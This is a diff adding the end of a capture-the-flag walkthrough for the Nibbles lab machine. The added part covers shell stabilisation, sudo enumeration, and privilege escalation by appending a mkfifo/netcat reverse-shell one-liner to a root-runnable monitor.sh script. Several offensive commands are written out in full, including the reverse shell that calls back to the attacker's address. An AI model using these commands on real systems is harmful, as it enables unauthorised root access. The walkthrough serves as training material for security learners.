@@ -131,9 +131,108 @@ set rhost <target=machine>
 set targeturi /nibbleblog/
 
 run
+
 ```
 
+
 ![image](https://cdn-images-1.medium.com/max/1000/1*B4Bn9ppeAtkNYmhTibOJrA.png)
+
+
+Stabilized the shell with:
+
+```bash
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*QDLymSfm1yv52sq-R4ZXNg.png)
+
+There is zip file maybe there is something:
+
+
+
+```bash
+unzip personal.zip
+```
+
+and there is a script "monitor.sh". Let's check if can we run files as root with:
+
+```bash
+sudo -l
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*2NeIv8555jTiQxE-C9Qk6w.png)
+
+
+Because we know that this file can run as root so let's upload a reverse shell payload to the file:
+
+```bash
+echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tun-0> 2222 >/tmp/f' >> monitor.sh    
+```
+
+Set netcat listener on your machine:
+
+```bash
+nc -lnvp 2222
+```
+
+then run monitor.sh :
+
+```bash
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+and there is reverse shell as root:
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*tYtmcGedyOT67-_N1pG50w.png)
+
+
+grab /root/root.txt
+
+and this is it for now.
+
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
